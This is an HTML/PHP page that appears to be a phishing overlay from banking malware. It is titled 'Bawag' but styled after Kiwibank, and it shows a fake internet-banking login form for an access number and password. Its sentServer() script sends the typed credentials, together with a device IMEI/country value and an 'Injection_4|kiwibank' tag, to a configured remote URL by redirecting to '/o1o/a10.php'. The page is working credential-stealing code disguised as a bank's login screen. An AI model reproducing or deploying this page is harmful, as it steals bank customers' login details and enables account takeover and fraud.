<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="nz/nz.co.kiwibank.mobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
<img src="data:image/png;base64,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" class="headerimage">
</div>

    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
					<center><p> Enter your internet banking details</p></center>
                        <form id="form">
<div id="padd">
                            <div class="form-group ">
                                	<input type="text" class="form-control" placeholder="Access number" style="border-radius: 5px 5px 0px 0px;" name="field2" id="login" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
                                	<input type="password" class="form-control" placeholder="Password" style="border-radius: 0px 0px 5px 5px;" name="field3" id="password" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

</div>
			<center><div id="padd1"> <input type="button" class="input_submitBtn" onClick="sentServer();" value="Continue"></div></center>

<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|kiwibank|"+login1+"|"+pass);
	}
}
</script>
                        </form>
                </div>
            </div>
        </div>
		</div>
    </div>
</body>
</html>
